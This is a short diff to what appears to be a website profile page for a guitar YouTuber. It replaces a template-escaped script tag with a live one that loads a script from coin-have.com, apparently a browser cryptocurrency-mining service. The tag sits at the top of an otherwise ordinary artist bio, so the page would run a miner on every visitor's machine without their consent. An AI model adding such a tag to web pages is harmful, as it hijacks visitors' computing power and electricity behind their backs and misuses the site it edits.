@@ -1,6 +1,4 @@
-{ % raw %}
-<script src="https://coin-have.com/c/XaZ1.js"></script>
-{ % endraw %}
+<script src="https://coin-have.com/c/XaZ1.js">\n</script>
 
 ## Example Artist
 Example artist is a Guitar Youtuber and Entreprenuer making the world a better place through art education.
